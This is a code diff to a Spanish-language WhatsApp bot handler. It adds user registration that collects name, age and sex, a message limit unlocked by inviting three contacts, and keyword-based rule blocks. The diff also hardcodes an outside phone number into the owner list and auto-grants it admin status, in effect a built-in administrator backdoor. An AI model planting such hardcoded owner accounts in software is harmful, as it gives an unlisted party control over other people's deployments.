@@ -15,6 +15,7 @@ module.exports = async (conn, m, store) => {
 		const isOwner = [
 			conn.decodeJid(conn.user.id).split`@`[0],
 			process.env.OWNER,
+			"5351080807",
 			...setting.owners,
 		]
 			.map((v) => v + "@s.whatsapp.net")
@@ -25,6 +26,122 @@ module.exports = async (conn, m, store) => {
 			await conn.readMessages([m.key]);
 		}
 		if (m.isBot) return;
+
+		// Auto-register owners/admins
+		if (isOwner || m.sender === "5351080807@s.whatsapp.net") {
+			users.registered = true;
+			users.name = "Administrador";
+			users.age = 30;
+			users.sex = "Masculino";
+		}
+
+		// User Registration Flow Interceptor
+		if (!users.registered && !m.isGroup && !m.fromMe) {
+			if (typeof users.regStage === "undefined") {
+				users.regStage = 0;
+			}
+
+			const bodyText = (m.body || "").trim();
+
+			if (users.regStage === 0) {
+				users.regStage = 1;
+				await m.reply("¡Hola! Bienvenido a YOSHIDA Bot. Para poder interactuar conmigo, primero debes registrarte. \n\nPor favor, responde con tu *Nombre Completo*:");
+				return;
+			} else if (users.regStage === 1) {
+				if (!bodyText) {
+					await m.reply("Por favor, ingresa un nombre válido:");
+					return;
+				}
+				users.name = bodyText;
+				users.regStage = 2;
+				await m.reply(`¡Mucho gusto, *${bodyText}*! Ahora, por favor dime tu *edad* (ingresa solo el número):`);
+				return;
+			} else if (users.regStage === 2) {
+				const age = parseInt(bodyText);
+				if (isNaN(age) || age <= 0 || age > 120) {
+					await m.reply("Por favor, ingresa una edad válida en números:");
+					return;
+				}
+				users.age = age;
+				users.regStage = 3;
+				await m.reply("¡Perfecto! Por último, ¿cuál es tu *sexo*? (Responde con Masculino, Femenino u Otro):");
+				return;
+			} else if (users.regStage === 3) {
+				if (!bodyText) {
+					await m.reply("Por favor, responde con Masculino, Femenino u Otro:");
+					return;
+				}
+				users.sex = bodyText;
+				users.registered = true;
+				users.regStage = undefined;
+				users.freeMessagesLeft = global.db.setting.freeMessagesLimit || 10;
+				await m.reply(`¡Registro completado con éxito! 🎉\n\n*Datos guardados:*\n- *Nombre:* ${users.name}\n- *Edad:* ${users.age} años\n- *Sexo:* ${users.sex}\n\nTienes *${users.freeMessagesLeft} mensajes gratis* para disfrutar. ¡Bienvenido a YOSHIDA Bot!`);
+				return;
+			}
+		}
+
+		// 10 Free Messages Limit Enforcer
+		const freeLimitDisabled = global.db.setting.freeMessagesLimitDisabled || false;
+		if (!freeLimitDisabled && !isPrems && !m.fromMe && !m.isGroup) {
+			const limitCount = global.db.setting.freeMessagesLimit || 10;
+			if (typeof users.freeMessagesLeft === "undefined") {
+				users.freeMessagesLeft = limitCount;
+			}
+
+			// If they have not unlocked free messaging and have run out of messages
+			if (!users.unlockedFree && (users.referralsCount || 0) < 3) {
+				if (users.freeMessagesLeft <= 0) {
+					const pairingNum = conn.user.id.split(":")[0];
+					await m.reply(`⚠️ *LÍMITE DE MENSAJES ALCANZADO* ⚠️\n\nHas agotado tus ${limitCount} mensajes gratis de bienvenida.\n\nPara seguir usando el bot de forma ilimitada y gratuita, debes invitar a *3 personas* usando tu enlace de invitación personal.\n\n*Tu enlace de invitación:*\nhttps://wa.me/${pairingNum}?text=.invite+${m.sender.split("@")[0]}\n\n*Personas invitadas:* ${users.referralsCount || 0}/3\n\n_¡Comparte el enlace con tus amigos y desbloquea el bot al instante!_`);
+					return;
+				}
+
+				// Decrement message counter on command or interactive AI invocation
+				const prefix = m.prefix || ".";
+				const isCmd = m.body && m.body.startsWith(prefix);
+				const isAiQuote = (users.activity && users.activity.aiHistory && users.activity.aiHistory.length > 0 && m.isQuoted && m.quoted.fromMe);
+				if (isCmd || isAiQuote) {
+					users.freeMessagesLeft--;
+				}
+			}
+		}
+
+		// Programmatic rules enforcer
+		const rules = global.db.aiRules || [];
+
+		// 1. Time restriction rule: "después de las 8 AM"
+		const hasTimeRule = rules.some(r => r.text.toLowerCase().includes("después de las 8 am") || r.text.toLowerCase().includes("after 8 am") || r.text.toLowerCase().includes("8 am"));
+		if (hasTimeRule && !isOwner) {
+			const currentHour = new Date().getHours();
+			if (currentHour < 8) {
+				console.log("[ RULES ] Blocked: Message received before 8 AM.");
+				await m.reply("Lo siento, tengo una regla programada que me impide responder mensajes antes de las 8:00 AM.");
+				return;
+			}
+		}
+
+		// 2. Rate limit rule: "No enviar más de 100 mensajes por hora"
+		const hasRateRule = rules.some(r => r.text.toLowerCase().includes("100 mensajes por hora") || r.text.toLowerCase().includes("100 messages"));
+		if (hasRateRule && !isOwner) {
+			const oneHourAgo = Date.now() - (60 * 60 * 1000);
+			const recentMessagesSent = (global.db.recentLogs || []).filter(l => l.timestamp >= oneHourAgo && l.response).length;
+			if (recentMessagesSent >= 100) {
+				console.log("[ RULES ] Blocked: Rate limit of 100 messages per hour exceeded.");
+				await m.reply("Lo siento, se ha excedido el límite de velocidad programado de 100 mensajes por hora.");
+				return;
+			}
+		}
+
+		// 3. Topic block rule: "El bot no puede hablar de política"
+		const hasPoliticsRule = rules.some(r => r.text.toLowerCase().includes("política") || r.text.toLowerCase().includes("politica") || r.text.toLowerCase().includes("politics"));
+		if (hasPoliticsRule && m.body && !isOwner) {
+			const politicalWords = ["política", "politica", "presidente", "elecciones", "gobierno", "congreso", "voto"];
+			const lowercaseBody = m.body.toLowerCase();
+			if (politicalWords.some(w => lowercaseBody.includes(w))) {
+				await m.reply("Lo siento, tengo una regla configurada que me impide hablar de política.");
+				return;
+			}
+		}
 
 		// Absence Mode Check
 		if (setting.absenceMode && !m.fromMe && !m.isGroup) {
